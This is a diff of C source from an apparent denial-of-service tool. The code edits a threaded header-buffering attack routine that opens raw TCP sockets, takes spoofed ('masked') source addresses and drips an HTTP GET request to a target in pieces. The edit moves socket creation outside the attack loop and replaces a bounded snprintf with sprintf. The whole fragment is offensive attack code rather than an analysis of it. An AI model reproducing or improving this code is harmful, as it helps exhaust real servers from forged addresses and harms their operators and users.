@@ -6,7 +6,6 @@
 #include "ddos/header_buffering.h"
 
 #define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-#define GET_METHOD_LEN 50
 extern int g_num_threads;
 
 // session counting
@@ -37,16 +36,17 @@ void *GenerateHeaderBuffering(void *data)
 {
   int thread_id = *((int*) data);
   // make tcp connection
-  int sock = -1;
   int src_port, seq, ack;
   int head_buffering_cnt = 0;
   int index = 0;
 
-  char get_method[GET_METHOD_LEN];
-  snprintf(get_method, sizeof(get_method), "%s",
-      "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
+  char get_method[100];
+
+  sprintf(get_method,"%s",GET_METHOD);
 
   int get_method_len = strlen(get_method);
+  int sock = MakeRawSocket(IPPROTO_TCP);
+
 
   while (1) {
     // *** begin of critical section ***
@@ -56,10 +56,7 @@ void *GenerateHeaderBuffering(void *data)
     // get now resource
     GetMaskingArguments(&g_headbuf_input, &g_headbuf_now);
     if (head_buffering_cnt % get_method_len == 0) {
-      if (sock != -1) {
-        close(sock);
-      }
-	sock = MakeRawSocket(IPPROTO_TCP);
+	
       	  MakeTcpConnection(
           sock,
 	  inet_addr(g_headbuf_now.src),
